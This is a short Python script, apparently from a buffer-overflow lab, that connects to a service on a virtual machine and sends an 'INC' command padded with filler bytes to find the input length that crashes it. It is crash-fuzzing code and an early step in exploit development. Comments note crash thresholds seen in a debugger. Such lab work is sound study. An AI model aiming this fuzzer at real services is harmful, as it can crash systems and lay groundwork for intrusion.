import socket,time

#ip = '192.168.56.1'
ip ='10.0.2.15' #vm ip
#port = 8421
port = 2223
def attack(payload):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:#connects to the server
        s.connect((ip, port))
        response = s.recv(1024)    # <-- wait for reply
        print(str(response)+'\n')
        time.sleep(1)
        s.sendall(payload)
        time.sleep(1)
        response = s.recv(1024)    # <-- wait for reply
        print(response)
        
# def connect():
#     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
#         s.connect((ip, port))
#         banner = s.recv(1024)
#         print(str(banner)+f"\n")

#         s.sendall(b"INC 1111\n")

#         response = s.recv(1024)    # <-- wait for reply
#         print(response)

#         s.sendall(b"INC 1112\n")
#         response = s.recv(1024)    # <-- wait for reply
#         print(response)

def fuzzer():
    #bytesNum = 9 #before crash
    #bytesNum = 10 #to crash server
    bytesNum = 1#x32dbg crashes at 6bytes
    garbage = b'INC ' +b'1111'*bytesNum+b'ZIFE'+b'3'+b'\n'#repeatedly sents bytes by increments of 10
    try:
        attack(garbage)
        print(str(bytesNum+5)+" bytes sent")
        
    except:
        print("Crash at " + str(bytesNum+5) + " bytes")#identifies when the program crashes
        

def main(): 
    fuzzer()
    #connect()

if __name__ == '__main__':
    main()